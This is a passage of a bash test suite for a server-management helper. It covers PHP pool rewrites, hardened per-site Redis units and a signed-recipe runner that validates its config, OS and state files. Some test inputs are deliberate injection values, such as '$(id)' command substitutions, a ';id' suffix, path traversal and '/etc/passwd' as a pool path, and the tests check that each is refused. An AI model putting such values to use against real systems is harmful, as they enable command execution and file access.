run: service php8.3-fpm reload" php-pool-write 8.4 shop_other
lacks "the same version removes nothing" "rm -f" php-pool-write 8.3 shop_other
lacks "the same version reloads only itself" "php8.4" php-pool-write 8.3 shop_other
printf 'DOMAIN=other.example\nPOOL=/etc/php/8.3/fpm/pool.d/eeploi-shop_example.conf\n' > "$WORK/etc-sites/sites/shop_other"
refuse "a listed pool of another site" "invalid POOL in" php-pool-write 8.4 shop_other
printf 'DOMAIN=other.example\nPOOL=/etc/passwd\n' > "$WORK/etc-sites/sites/shop_other"
refuse "a listed pool outside pool.d" "invalid POOL in" php-pool-write 8.4 shop_other
cp -p "$WORK/shop_other.saved" "$WORK/etc-sites/sites/shop_other"
# The real run: the old pool is kept until the old version's test passes, and put back with the new one.
sed -n '/^  php-pool-write)$/,/^  self-update)$/p' "$HELPER" > "$WORK/php-pool-write.txt"
check "php-pool-write puts both pools back when the old version fails its test" \
  grep -qF "mv -f \"${D}old_backup\" \"${D}old\"" "$WORK/php-pool-write.txt"

echo "== the registry: one scan per call, the lock around Supervisor's check and write"
check "registry_user is gone" bash -c "! grep -q 'registry_user' '$HELPER'"
check "the scan runs once per call" grep -qF "[ ${D}REG_SCANNED -eq 0 ] || return 0" "$HELPER"
check "a site user is checked once per call" grep -qF "SITE_USER_OK=\"ok:${D}1\"" "$HELPER"
sed -n '/^  supervisor-write)$/,/^  supervisor-remove)$/p' "$HELPER" > "$WORK/supervisor-write.txt"
lock_line=$(grep -n '^    registry_lock$' "$WORK/supervisor-write.txt" | cut -d: -f1)
find_line=$(grep -n 'registry_find "SUPERVISOR=' "$WORK/supervisor-write.txt" | cut -d: -f1)
put_line=$(grep -nF "| put \"${D}file\" 644" "$WORK/supervisor-write.txt" | cut -d: -f1)
unlock_line=$(grep -n '^    registry_unlock ;;$' "$WORK/supervisor-write.txt" | cut -d: -f1)
if [ -n "$lock_line" ] && [ "$lock_line" -lt "$find_line" ] && [ "$find_line" -lt "$put_line" ] && [ "$put_line" -lt "$unlock_line" ]; then pass; else
  failure "supervisor-write: lock, check, write, unlock" "$lock_line $find_line $put_line $unlock_line"; fi

echo "== db-create socket login: the site-user stand-in only"
{ echo 'uid=1001'; db_state 0 0 0 0 0 0 0; } > "$WORK/db-with-uid"
DBSTATE="$WORK/db-with-uid" refuse "no uid line in the database state" "cannot read the mysql checks: uid=1001" db-create mysql $S $S socket
check "db_unix_user is gone" bash -c "! grep -q 'db_unix_user' '$HELPER'"

echo "== Redis per site"
ok "redis unit" "write: /etc/systemd/system/eeploi-redis@.service (644)" redis-create shop_example
ok "redis unit runs as the site user" "  User=%i
  Group=%i
  ExecStart=/usr/bin/redis-server /etc/eeploi/redis/%i.conf --supervised systemd --daemonize no" redis-create shop_example
ok "redis config" "  port 0
  unixsocket /srv/eeploi/shop_example/.redis/redis.sock
  unixsocketperm 600
  dir /srv/eeploi/shop_example/.redis
  appendonly yes
  maxmemory 128mb
  maxmemory-policy noeviction
  enable-module-command no
  enable-debug-command no
write: $WORK/etc-sites/redis/shop_example.conf (644)" redis-create shop_example
for line in MemorySwapMax=0 NoNewPrivileges=yes PrivateTmp=yes PrivateDevices=yes ProtectSystem=strict ProtectHome=yes \
  ProtectKernelTunables=yes ProtectKernelModules=yes ProtectKernelLogs=yes ProtectControlGroups=yes ProtectClock=yes \
  ProtectHostname=yes RestrictNamespaces=yes RestrictRealtime=yes LockPersonality=yes; do
  ok "redis unit $line" $'\n'"  $line"$'\n' redis-create shop_example
done
# Only Unix sockets: its own socket and systemd's notify socket both are.
ok "redis unit: Unix sockets only" $'\n'"  RestrictAddressFamilies=AF_UNIX"$'\n' redis-create shop_example
ok "redis unit: notify through systemd's Unix socket" "  Type=notify" redis-create shop_example
lacks "redis unit allows no network family" "AF_INET" redis-create shop_example
ok "redis drop-in" "  [Service]
  MemoryMax=164M
write: /etc/systemd/system/eeploi-redis@shop_example.service.d/memory.conf (644)" redis-create shop_example
ok "redis reload" "run: systemctl daemon-reload" redis-create shop_example
ok "redis folder made by the site user" "run: runuser -u shop_example -- install -d -m 700 /srv/eeploi/shop_example/.redis" redis-create shop_example
ok "redis in the registry" "  REDIS_CONF=$WORK/etc-sites/redis/shop_example.conf
  REDIS_UNIT=eeploi-redis@shop_example.service
  REDIS_DROPIN=/etc/systemd/system/eeploi-redis@shop_example.service.d/memory.conf
  REDIS_SOCKET=/srv/eeploi/shop_example/.redis/redis.sock" redis-create shop_example
ok "redis prepared, stopped" "prepared: Redis of site user shop_example, 128 MB, stopped" redis-create shop_example
for text in 'systemctl start' 'systemctl enable' 'systemctl restart' 'enable --now'; do
  lacks "redis-create starts nothing: no $text" "$text" redis-create shop_example
done
for text in 'chown' 'install -d -o root -g root -m 755 /srv'; do
  lacks "redis-create: root writes nothing in the home: no $text" "$text" redis-create shop_example
done
ok "redis size 32" "  maxmemory 32mb" redis-create shop_example 32
ok "redis cap at 32" "  MemoryMax=68M" redis-create shop_example 32
ok "redis size 1024" "  maxmemory 1024mb" redis-create shop_example 1024
ok "redis cap at 1024" "  MemoryMax=1060M" redis-create shop_example 1024
ok "redis size 256" "prepared: Redis of site user shop_example, 256 MB" redis-create shop_example 256
SYS="$WORK/system-redis-on" ok "a running Redis restarts on a new size" "run: systemctl restart eeploi-redis@shop_example" redis-create shop_example 64
SYS="$WORK/system-redis-on" ok "the registry after the restart" "run: systemctl restart eeploi-redis@shop_example
  # Written by eeploi-helper" redis-create shop_example 64
SYS="$WORK/system-redis-on" ok "restarted" "prepared: Redis of site user shop_example, 64 MB, restarted" redis-create shop_example 64
# Kept before anything is rewritten, and put back on a failed restart: the template too.
sed -n '/^  redis-create)$/,/^  redis-start)$/p' "$HELPER" > "$WORK/redis-create.txt"
# line_of <text>: the line number of the first line in redis-create that has the text.
line_of() { grep -nF -- "$1" "$WORK/redis-create.txt" | head -1 | cut -d: -f1; }
keep_line=$(line_of "keep \"${D}REDIS_TEMPLATE\" \"${D}conf\" \"${D}dropin\"")
template_line=$(line_of "put \"${D}REDIS_TEMPLATE\"")
restart_line=$(line_of "systemctl restart \"${D}unit\" 2>&1")
registry_line=$(line_of "registry_edit \"${D}1\" set \"REDIS_UNIT=")
if [ -n "$keep_line" ] && [ -n "$template_line" ] && [ "$keep_line" -lt "$template_line" ] && [ "$restart_line" -lt "$registry_line" ]; then pass; else
  failure "redis-create: keep the template first, the registry after the restart" "$keep_line $template_line $restart_line $registry_line"; fi
SYS="$WORK/system-no-redis" ok "redis-create without redis-server" "prepared: Redis of site user shop_example" redis-create shop_example
for bad in 31 1025 0 64mb 64.5 ' 64' 064 -64 '' 1e3 'x'; do
  refuse "redis size '$bad'" "the Redis size must be a whole number of MB from 32 to 1024: $bad" redis-create shop_example "$bad"
done
refuse "redis-create extra argument" "usage" redis-create shop_example 64 x
ok "redis-start" "run: systemctl enable --now eeploi-redis@shop_example" redis-start shop_example
ok "redis-stop" "run: systemctl disable --now eeploi-redis@shop_example" redis-stop shop_example
refuse "redis-start before redis-create" "no Redis for site user shop_other yet: run redis-create first" redis-start shop_other
SYS="$WORK/system-no-redis" refuse "redis-start without redis-server" "Redis is not installed on this server (no /usr/bin/redis-server): install the redis-server package first" redis-start shop_example
for sub in redis-create redis-start redis-stop; do
  refuse "$sub for an unlisted user" "alex_web is not an eeploi site user" "$sub" alex_web
  for reserved in root eeploi redis; do
    refuse "$sub for $reserved" "reserved name, not a site user: $reserved" "$sub" "$reserved"
  done
  refuse "$sub for www-data" "invalid site user: www-data" "$sub" www-data
  refuse "$sub for a site user in sudo" "in other groups too" "$sub" shop_sudo
  refuse "$sub without a user" "usage" "$sub"
  AS=ploi refuse "$sub from ploi" "$GATE" "$sub" shop_example
done
refuse "redis-start extra argument" "usage" redis-start shop_example now
refuse "redis-stop extra argument" "usage" redis-stop shop_example now

echo "== recipe-run: arguments and the recipes key"
check "minisign, for the recipe-run tests" command -v minisign
# A test key pair for recipes releases, made here (never the real one), and a copy of the helper with it.
RKEY="$WORK/recipes-key"
minisign -G -W -p "$RKEY.pub" -s "$RKEY.sec" > /dev/null
minisign -G -W -p "$RKEY-other.pub" -s "$RKEY-other.sec" > /dev/null
TEST_KEY=$(sed -n 2p "$RKEY.pub")
sed "s#^RECIPES_PUBKEY=.*#RECIPES_PUBKEY='$TEST_KEY'#" "$HELPER" > "$WORK/recipes-helper"
sed "s#^RECIPES_PUBKEY=.*#RECIPES_PUBKEY='RWQ-not-a-key'#" "$HELPER" > "$WORK/recipes-badkey-helper"
# The files of a test release, as the recipes lay them out. Never run: a dry run only prints them.
# rfile <path> <text>: one file in the release's source folder ($WORK/rsrc, or RSRC).
rfile() {
  local src=${RSRC:-$WORK/rsrc}
  mkdir -p "$src/$(dirname "$1")"
  printf '%b' "$2" > "$src/$1"
}
rfile stack/start.sh '#!/usr/bin/env bash\n# eeploi provisioning for {name}. Run once as root on a fresh Ubuntu {version}.\nset -euo pipefail\n'
# The $ in the test files is for their own shell: a dry run never runs them.
# shellcheck disable=SC2016
rfile stack/values.sh 'DEPLOY_USER={user}\nSSH_PORT={port}\nPHP={php}\n. /etc/os-release; [ "$VERSION_ID" = "{version}" ]\n'
rfile first-boot/start.sh 'curl {report_url}\n'
rfile first-boot/00-lock-root.sh 'echo lock-root {report_url}\n'
rfile first-boot/00-lock-root.check.sh 'echo check-lock-root\n'
rfile stack/00-apt-retries.sh 'echo apt-retries\n'
rfile stack/00-apt-retries.check.sh 'echo check-apt-retries\n'
rfile ubuntu-26.04/01-packages.sh 'apt-get install {database}\n'
# shellcheck disable=SC2016 # bash's own braces, not placeholders
rfile stack/07-updates.sh 'echo "${distro_id}" "$nrconf{restart}"\n'
# shellcheck disable=SC2016
rfile stack/07-updates.check.sh 'echo check-updates $PHP\n'
# shellcheck disable=SC2016
rfile stack/09-logs.sh 'echo logs $DEPLOY_USER\n'
rfile stack/09-logs.check.sh 'echo check-logs\n'
rfile stack/fingerprint.sh 'echo fingerprint\n'
RELEASE_STEPS='first-boot first-boot/00-lock-root.sh
always stack/00-apt-retries.sh
window ubuntu-26.04/01-packages.sh
always stack/07-updates.sh
always stack/09-logs.sh'
RELEASE_FILES='stack/start.sh first-boot/start.sh stack/values.sh first-boot/00-lock-root.check.sh stack/00-apt-retries.check.sh stack/07-updates.check.sh stack/09-logs.check.sh stack/fingerprint.sh'
rsha() { sha256sum < "$1" | cut -d' ' -f1; }
# rsign <manifest> [<key> [<minisign flags...>]]: its .minisig, with the test key or another.
rsign() {
  rm -f "$1.minisig"
  minisign -S -s "${2:-$RKEY.sec}" "${@:3}" -m "$1" > /dev/null
}
# release <name> [<version> [<provider> [<os> [<min-helper>]]]]: a signed release of the source folder
# in $WORK/rel-<name>: the package, the manifest and its signature.
release() {
  local dir="$WORK/rel-$1" v=${2:-0.4.0} provider=${3:-hetzner} os=${4:-ubuntu-26.04} min=${5:-1.1.0}
  local src=${RSRC:-$WORK/rsrc} m marker path f
  mkdir -p "$dir"
  m="$dir/recipes-$v-$provider-$os.manifest"
  {
    printf 'format 1\nrelease %s\ntarget %s %s\nmin-helper %s\n' "$v" "$provider" "$os" "$min"
    while read -r marker path; do echo "step $(rsha "$src/$path") $marker 0.1.0 0.4.0 - $path"; done <<< "$RELEASE_STEPS"
    for f in $RELEASE_FILES; do echo "file $(rsha "$src/$f") $f"; done
  } > "$m"
  rpack "$src" "$dir/recipes-$v.tar.gz"
  rsign "$m"
}
# rpack <source folder> <package> [<more paths>]: the release's files from the folder, as a package.
rpack() {
  # shellcheck disable=SC2046,SC2086 # the paths have no spaces
  (cd "$1" && COPYFILE_DISABLE=1 tar -czf "$2" $(cut -d' ' -f2 <<< "$RELEASE_STEPS") $RELEASE_FILES ${3:-} 2> /dev/null)
}
# remanifest <name> <command...>: the good release, its manifest changed by the command (a filter),
# then signed again.
remanifest() {
  local name=$1 m="$WORK/rel-$1/recipes-0.4.0-hetzner-ubuntu-26.04.manifest"
  shift
  cp -R "$WORK/rel-good" "$WORK/rel-$name"
  "$@" < "$WORK/rel-good/${m##*/}" > "$m"
  rsign "$m"
}
release good
release os24 0.4.0 hetzner ubuntu-24.04
release do2 0.4.0 do-2
release v041 0.4.1
release v0101 0.10.1
# recipes_dir <name> <recipes.conf text> [<helper.conf text>]: an /etc/eeploi of its own.
recipes_dir() {
  mkdir -p "$WORK/etc-recipes-$1"
  chmod 755 "$WORK/etc-recipes-$1"
  printf '%b' "$2" > "$WORK/etc-recipes-$1/recipes.conf"
  [ -z "${3:-}" ] || printf '%b' "$3" > "$WORK/etc-recipes-$1/helper.conf"
}
recipes_dir good '# Written by step 0 of the eeploi recipes. KEY=value, each key once.\nDEPLOY_USER=eeploi\nSSH_PORT=22\nPHP=8.4\n'
printf 'NAME="Ubuntu"\nVERSION_ID="26.04"\nID=ubuntu\nID_LIKE=debian\nPRETTY_NAME="Ubuntu 26.04 LTS"\n' > "$WORK/os-release"
mkdir -p "$WORK/recipes-none"
# recipe <ok|refuse> <name> <expected> <args...>: with the good values file and the fake recipes key.
recipe() { local kind=$1; shift; ETC_DIR=${ETC_DIR:-$WORK/etc-recipes-good} BIN=${BIN:-$WORK/recipes-helper} "$kind" "$@"; }
recipe ok "first line" "recipe-run 0.4.0 hetzner ubuntu-26.04" recipe-run 0.4.0 hetzner
recipe ok "manifest for the provider and OS" "download: https://github.com/eeploi/recipes/releases/download/v0.4.0/recipes-0.4.0-hetzner-ubuntu-26.04.manifest" recipe-run 0.4.0 hetzner
recipe ok "its signature" "download: https://github.com/eeploi/recipes/releases/download/v0.4.0/recipes-0.4.0-hetzner-ubuntu-26.04.manifest.minisig" recipe-run 0.4.0 hetzner
recipe ok "the package" "download: https://github.com/eeploi/recipes/releases/download/v0.4.0/recipes-0.4.0.tar.gz" recipe-run 0.4.0 hetzner
recipe ok "verified with the recipes key, not the helper's" "check: minisign -V -H -q -P $TEST_KEY -m recipes-0.4.0-hetzner-ubuntu-26.04.manifest" recipe-run 0.4.0 hetzner
recipe ok "logged" "log: eeploi-helper: eeploi: recipe-run 0.4.0 hetzner" recipe-run 0.4.0 hetzner
sed "s#^RECIPES_PUBKEY=.*#RECIPES_PUBKEY='RWS...REPLACE_WITH_RECIPES_KEY'#" "$HELPER" > "$WORK/recipes-placeholder-helper"
BIN="$WORK/recipes-placeholder-helper" recipe refuse "placeholder recipes key" "no recipes key in this build (RECIPES_PUBKEY is the placeholder), recipe-run refused" recipe-run 0.4.0 hetzner
# The helper itself carries the real recipes key: a release signed with the test key fails its check.
REAL_RECIPES_KEY=$(sed -n "s/^RECIPES_PUBKEY='\\(.*\\)'$/\\1/p" "$HELPER")
BIN="$HELPER" recipe refuse "the built-in recipes key" "check: minisign -V -H -q -P $REAL_RECIPES_KEY -m" recipe-run 0.4.0 hetzner
BIN="$HELPER" recipe refuse "the built-in key refuses a test release" "signature check failed: recipes-0.4.0-hetzner-ubuntu-26.04.manifest, nothing ran" recipe-run 0.4.0 hetzner
check "the built-in recipes key is not the test key" test "$REAL_RECIPES_KEY" != "$TEST_KEY"
BIN="$WORK/recipes-badkey-helper" recipe refuse "malformed recipes key" "invalid recipes key in this build, recipe-run refused" recipe-run 0.4.0 hetzner
recipe refuse "no arguments" "usage: recipe-run <version> <provider>" recipe-run
recipe refuse "no provider" "usage: recipe-run <version> <provider>" recipe-run 0.4.0
recipe refuse "extra argument" "usage: recipe-run <version> <provider>" recipe-run 0.4.0 hetzner x
for v in 0.4 v0.4.0 0.4.0.1 00.4.0 0.04.0 '0.4.0 ' '0.4.0;id' 10000.0.0 ''; do
  recipe refuse "version '$v'" "invalid version: $v" recipe-run "$v" hetzner
done
for p in Hetzner -hetzner hetzner- 'het zner' ../x 'a/b' '' "$(printf 'a%.0s' {1..33})"; do
  recipe refuse "provider '$p'" "invalid provider: $p" recipe-run 0.4.0 "$p"
done
RDL="$WORK/rel-do2" recipe ok "provider with a dash and digits" "recipe-run 0.4.0 do-2 ubuntu-26.04" recipe-run 0.4.0 do-2
AS=ploi recipe refuse "only the deploy user" "$GATE" recipe-run 0.4.0 hetzner

echo "== recipe-run: the values file"
recipes_dir deploy 'DEPLOY_USER=deploy\nSSH_PORT=22\nPHP=8.4\n' 'DEPLOY_USER=deploy\n'
recipes_dir port 'DEPLOY_USER=eeploi\nSSH_PORT=10000\nPHP=8.3\n'
recipes_dir porttop 'PHP=8.4\nSSH_PORT=32767\nDEPLOY_USER=eeploi\n'
recipes_dir mismatch 'DEPLOY_USER=deploy\nSSH_PORT=22\nPHP=8.4\n'
recipes_dir mismatch2 'DEPLOY_USER=eeploi\nSSH_PORT=22\nPHP=8.4\n' 'DEPLOY_USER=deploy\n'
recipes_dir root 'DEPLOY_USER=root\nSSH_PORT=22\nPHP=8.4\n'
recipes_dir baduser 'DEPLOY_USER=Eeploi\nSSH_PORT=22\nPHP=8.4\n'
recipes_dir extra 'DEPLOY_USER=eeploi\nSSH_PORT=22\nPHP=8.4\nPATH=/tmp\n'
recipes_dir space 'DEPLOY_USER=eeploi\nSSH_PORT = 22\nPHP=8.4\n'
recipes_dir export 'DEPLOY_USER=eeploi\nexport SSH_PORT=22\nPHP=8.4\n'
# shellcheck disable=SC2016 # the literal $(id) is the point: it must never run
recipes_dir inject 'DEPLOY_USER=eeploi\nSSH_PORT=$(id)\nPHP=8.4\n'
recipes_dir quoted 'DEPLOY_USER=eeploi\nSSH_PORT="22"\nPHP=8.4\n'
recipes_dir cr 'DEPLOY_USER=eeploi\nSSH_PORT=22\r\nPHP=8.4\n'
recipes_dir twiceuser 'DEPLOY_USER=eeploi\nDEPLOY_USER=eeploi\nSSH_PORT=22\nPHP=8.4\n'
recipes_dir twiceport 'DEPLOY_USER=eeploi\nSSH_PORT=22\nSSH_PORT=10000\nPHP=8.4\n'
recipes_dir twicephp 'DEPLOY_USER=eeploi\nSSH_PORT=22\nPHP=8.4\nPHP=8.4\n'
recipes_dir nouser 'SSH_PORT=22\nPHP=8.4\n'
recipes_dir noport 'DEPLOY_USER=eeploi\nPHP=8.4\n'
recipes_dir nophp 'DEPLOY_USER=eeploi\nSSH_PORT=22\n'
recipes_dir empty ''
recipes_dir badphp 'DEPLOY_USER=eeploi\nSSH_PORT=22\nPHP=8.40\n'
recipes_dir nonl 'DEPLOY_USER=eeploi\nSSH_PORT=22\nPHP=8.4'
recipes_dir writable 'DEPLOY_USER=eeploi\nSSH_PORT=22\nPHP=8.4\n'
chmod 666 "$WORK/etc-recipes-writable/recipes.conf"
recipes_dir openfolder 'DEPLOY_USER=eeploi\nSSH_PORT=22\nPHP=8.4\n'
chmod 777 "$WORK/etc-recipes-openfolder"
mkdir -p "$WORK/etc-recipes-link" "$WORK/etc-recipes-folder/recipes.conf"
chmod 755 "$WORK/etc-recipes-link" "$WORK/etc-recipes-folder"
ln -s "$WORK/etc-recipes-good/recipes.conf" "$WORK/etc-recipes-link/recipes.conf"
ETC_DIR="$WORK/etc-recipes-deploy" AS=deploy recipe ok "DEPLOY_USER from helper.conf" "recipe-run 0.4.0 hetzner" recipe-run 0.4.0 hetzner
ETC_DIR="$WORK/etc-recipes-port" recipe ok "SSH port 10000" "recipe-run 0.4.0 hetzner" recipe-run 0.4.0 hetzner
ETC_DIR="$WORK/etc-recipes-porttop" recipe ok "SSH port 32767, keys in any order" "recipe-run 0.4.0 hetzner" recipe-run 0.4.0 hetzner
ETC_DIR="$WORK/etc-recipes-nonl" recipe ok "no newline at the end" "recipe-run 0.4.0 hetzner" recipe-run 0.4.0 hetzner
ETC_DIR="$WORK/etc-sites" recipe refuse "no values file (a taken-over server)" "recipes.conf: this server was not built from a recipe that writes it, recipe-run refused" recipe-run 0.4.0 hetzner
ETC_DIR="$WORK/etc-recipes-mismatch" recipe refuse "DEPLOY_USER differs from the helper's" "DEPLOY_USER is deploy in $WORK/etc-recipes-mismatch/recipes.conf but eeploi for the helper" recipe-run 0.4.0 hetzner
ETC_DIR="$WORK/etc-recipes-mismatch2" AS=deploy recipe refuse "DEPLOY_USER differs from helper.conf" "DEPLOY_USER is eeploi in $WORK/etc-recipes-mismatch2/recipes.conf but deploy for the helper" recipe-run 0.4.0 hetzner
ETC_DIR="$WORK/etc-recipes-root" recipe refuse "DEPLOY_USER root" "invalid DEPLOY_USER in $WORK/etc-recipes-root/recipes.conf: root" recipe-run 0.4.0 hetzner
ETC_DIR="$WORK/etc-recipes-baduser" recipe refuse "DEPLOY_USER with a capital" "invalid DEPLOY_USER" recipe-run 0.4.0 hetzner
for bad in extra space export inject quoted cr; do
  ETC_DIR="$WORK/etc-recipes-$bad" recipe refuse "values file: line ($bad)" "invalid " recipe-run 0.4.0 hetzner
done
ETC_DIR="$WORK/etc-recipes-extra" recipe refuse "values file: another key" "invalid line in $WORK/etc-recipes-extra/recipes.conf: PATH=/tmp" recipe-run 0.4.0 hetzner
ETC_DIR="$WORK/etc-recipes-inject" recipe refuse "values file: a command, never run" "invalid SSH_PORT" recipe-run 0.4.0 hetzner
ETC_DIR="$WORK/etc-recipes-twiceuser" recipe refuse "DEPLOY_USER twice" "DEPLOY_USER is set twice" recipe-run 0.4.0 hetzner
ETC_DIR="$WORK/etc-recipes-twiceport" recipe refuse "SSH_PORT twice" "SSH_PORT is set twice" recipe-run 0.4.0 hetzner
ETC_DIR="$WORK/etc-recipes-twicephp" recipe refuse "PHP twice" "PHP is set twice" recipe-run 0.4.0 hetzner
ETC_DIR="$WORK/etc-recipes-nouser" recipe refuse "no DEPLOY_USER" "no DEPLOY_USER in" recipe-run 0.4.0 hetzner
ETC_DIR="$WORK/etc-recipes-noport" recipe refuse "no SSH_PORT" "no SSH_PORT in" recipe-run 0.4.0 hetzner
ETC_DIR="$WORK/etc-recipes-nophp" recipe refuse "no PHP" "no PHP in" recipe-run 0.4.0 hetzner
ETC_DIR="$WORK/etc-recipes-empty" recipe refuse "empty values file" "no DEPLOY_USER in" recipe-run 0.4.0 hetzner
ETC_DIR="$WORK/etc-recipes-badphp" recipe refuse "PHP 8.40" "invalid PHP in $WORK/etc-recipes-badphp/recipes.conf: 8.40" recipe-run 0.4.0 hetzner
for port in 21 23 2222 9999 32768 65535 010000 022 0 ''; do
  recipes_dir "port-$port" "DEPLOY_USER=eeploi\nSSH_PORT=$port\nPHP=8.4\n"
  ETC_DIR="$WORK/etc-recipes-port-$port" recipe refuse "SSH port '$port'" "invalid SSH_PORT in $WORK/etc-recipes-port-$port/recipes.conf: $port (22, or 10000 to 32767)" recipe-run 0.4.0 hetzner
done
ETC_DIR="$WORK/etc-recipes-writable" recipe refuse "values file writable by others" "untrusted values file" recipe-run 0.4.0 hetzner
ETC_DIR="$WORK/etc-recipes-openfolder" recipe refuse "values file in an open folder" "untrusted values file" recipe-run 0.4.0 hetzner
ETC_DIR="$WORK/etc-recipes-link" recipe refuse "values file is a link" "untrusted values file" recipe-run 0.4.0 hetzner
ETC_DIR="$WORK/etc-recipes-folder" recipe refuse "values file is a folder" "untrusted values file" recipe-run 0.4.0 hetzner

echo "== recipe-run: this server's OS"
mkdir -p "$WORK/os"
chmod 755 "$WORK/os"
printf 'ID=ubuntu\nVERSION_ID=24.04\n' > "$WORK/os/plain"
ln -s "$WORK/os/plain" "$WORK/os/link"
printf 'ID=ubuntu\nVERSION_ID="26.04\n' > "$WORK/os/open-quote"
printf 'ID=ubuntu\nVERSION_ID=26.04"\n' > "$WORK/os/close-quote"
printf "ID=ubuntu\nVERSION_ID='26.04'\n" > "$WORK/os/single"
printf 'ID=ubuntu\nVERSION_ID=26.04\nID=debian\n' > "$WORK/os/twice-id"
printf 'ID=ubuntu\nVERSION_ID=26.04\nVERSION_ID=24.04\n' > "$WORK/os/twice-version"
printf 'ID=ubuntu\n' > "$WORK/os/no-version"
printf 'VERSION_ID=26.04\n' > "$WORK/os/no-id"
# shellcheck disable=SC2016 # the literal $(id) is the point: it must never run
printf 'ID=ubuntu-$(id)\nVERSION_ID=26.04\n' > "$WORK/os/inject"
printf 'ID=../x\nVERSION_ID=26.04\n' > "$WORK/os/dots"
printf 'ID=ubuntu\nVERSION_ID=26.04\n' > "$WORK/os/writable"
chmod 666 "$WORK/os/writable"
OSREL="$WORK/os/plain" RDL="$WORK/rel-os24" recipe ok "os-release without quotes" "recipe-run 0.4.0 hetzner ubuntu-24.04" recipe-run 0.4.0 hetzner
OSREL="$WORK/os/plain" RDL="$WORK/rel-os24" recipe ok "the manifest of this OS" "recipes-0.4.0-hetzner-ubuntu-24.04.manifest" recipe-run 0.4.0 hetzner
# shellcheck disable=SC2016 # the step's own $VERSION_ID
OSREL="$WORK/os/plain" RDL="$WORK/rel-os24" recipe ok "the OS's version in the steps" '[ "$VERSION_ID" = "24.04" ]' recipe-run 0.4.0 hetzner
OSREL="$WORK/os/link" RDL="$WORK/rel-os24" recipe ok "os-release is a link, as on Ubuntu" "recipe-run 0.4.0 hetzner ubuntu-24.04" recipe-run 0.4.0 hetzner
OSREL="$WORK/os/plain" recipe refuse "no release for this OS" "download failed: https://github.com/eeploi/recipes/releases/download/v0.4.0/recipes-0.4.0-hetzner-ubuntu-24.04.manifest" recipe-run 0.4.0 hetzner
nothing_ran "no release for this OS"
# The manifest of ubuntu-26.04, under the name of ubuntu-24.04.
mkdir -p "$WORK/rel-renamed"
for f in "" .minisig; do cp "$WORK/rel-good/recipes-0.4.0-hetzner-ubuntu-26.04.manifest$f" "$WORK/rel-renamed/recipes-0.4.0-hetzner-ubuntu-24.04.manifest$f"; done
cp "$WORK/rel-good/recipes-0.4.0.tar.gz" "$WORK/rel-renamed/"
OSREL="$WORK/os/plain" RDL="$WORK/rel-renamed" recipe refuse "a manifest for another OS" "the manifest is for hetzner ubuntu-26.04, not hetzner ubuntu-24.04" recipe-run 0.4.0 hetzner
nothing_ran "a manifest for another OS"
for bad in open-quote close-quote single inject dots; do
  OSREL="$WORK/os/$bad" recipe refuse "os-release: $bad" "cannot read os-release" recipe-run 0.4.0 hetzner
done
OSREL="$WORK/os/twice-id" recipe refuse "os-release: ID twice" "ID is set twice" recipe-run 0.4.0 hetzner
OSREL="$WORK/os/twice-version" recipe refuse "os-release: VERSION_ID twice" "VERSION_ID is set twice" recipe-run 0.4.0 hetzner
OSREL="$WORK/os/no-version" recipe refuse "os-release: no VERSION_ID" "no ID or VERSION_ID" recipe-run 0.4.0 hetzner
OSREL="$WORK/os/no-id" recipe refuse "os-release: no ID" "no ID or VERSION_ID" recipe-run 0.4.0 hetzner
OSREL="$WORK/os/writable" recipe refuse "os-release writable by others" "untrusted or missing os-release" recipe-run 0.4.0 hetzner
OSREL="$WORK/os/none" recipe refuse "no os-release" "untrusted or missing os-release" recipe-run 0.4.0 hetzner

echo "== recipe-run: the last good run here"
SHA_A=$(printf 'a%.0s' {1..64})
# state_dir <name> <state text>: a state folder of its own.
state_dir() {
  mkdir -p "$WORK/recipes-$1"
  chmod 755 "$WORK/recipes-$1"
  printf '%b' "$2" > "$WORK/recipes-$1/state"
}
state_dir last "# Written by eeploi-helper (recipe-run)\nrelease 0.4.0\nstep $SHA_A stack/07-updates.sh\nstep $SHA_A ubuntu-26.04/01-packages.sh\n"
state_dir only "release 0.10.0\n"
state_dir norelease "step $SHA_A stack/07-updates.sh\n"
state_dir twice "release 0.4.0\nrelease 0.5.0\n"
state_dir badrelease "release 0.4\n"
state_dir dots "release 0.4.0\nstep $SHA_A stack/../07-updates.sh\n"
state_dir absolute "release 0.4.0\nstep $SHA_A /stack/07-updates.sh\n"
state_dir shortsha "release 0.4.0\nstep ${SHA_A%a} stack/07-updates.sh\n"
state_dir upper "release 0.4.0\nstep $(printf 'A%.0s' {1..64}) stack/07-updates.sh\n"
state_dir other "release 0.4.0\nrun $SHA_A stack/07-updates.sh\n"
state_dir writable "release 0.4.0\n"
chmod 666 "$WORK/recipes-writable/state"
mkdir -p "$WORK/recipes-link"
chmod 755 "$WORK/recipes-link"
ln -s "$WORK/recipes-last/state" "$WORK/recipes-link/state"
recipe ok "first run here" "recipe-run 0.4.0 hetzner" recipe-run 0.4.0 hetzner
RSTATE="$WORK/recipes-last" recipe ok "the same release again" "recipe-run 0.4.0 hetzner" recipe-run 0.4.0 hetzner
RSTATE="$WORK/recipes-last" RDL="$WORK/rel-v041" recipe ok "a newer release" "recipe-run 0.4.1 hetzner" recipe-run 0.4.1 hetzner
RSTATE="$WORK/recipes-last" recipe refuse "an older release" "recipes 0.4.0 ran here, 0.3.9 is older: refused" recipe-run 0.3.9 hetzner
RSTATE="$WORK/recipes-only" RDL="$WORK/rel-v0101" recipe ok "compared by number" "recipe-run 0.10.1 hetzner" recipe-run 0.10.1 hetzner
RSTATE="$WORK/recipes-only" recipe refuse "compared by number, not text" "recipes 0.10.0 ran here, 0.9.0 is older" recipe-run 0.9.0 hetzner
RSTATE="$WORK/recipes-norelease" recipe refuse "state without a release" "no release in" recipe-run 0.4.0 hetzner
RSTATE="$WORK/recipes-twice" recipe refuse "state: release twice" "release is set twice" recipe-run 0.4.0 hetzner
for bad in badrelease dots absolute shortsha upper other; do
  RSTATE="$WORK/recipes-$bad" recipe refuse "state: $bad" "invalid line in $WORK/recipes-$bad/state" recipe-run 0.4.0 hetzner
done
RSTATE="$WORK/recipes-writable" recipe refuse "state writable by others" "untrusted recipes state" recipe-run 0.4.0 hetzner
RSTATE="$WORK/recipes-link" recipe refuse "state is a link" "untrusted recipes state" recipe-run 0.4.0 hetzner

echo "== recipe-run: one at a time"
recipe ok "the lock, before the state and any download" "lock: $WORK/recipes-none/.lock
download: " recipe-run 0.4.0 hetzner
RSTATE="$WORK/recipes-new/state" recipe ok "a new state folder, root's" "run: install -d -o root -g root -m 755 $WORK/recipes-new
run: install -d -o root -g root -m 755 $WORK/recipes-new/state
lock: $WORK/recipes-new/state/.lock" recipe-run 0.4.0 hetzner
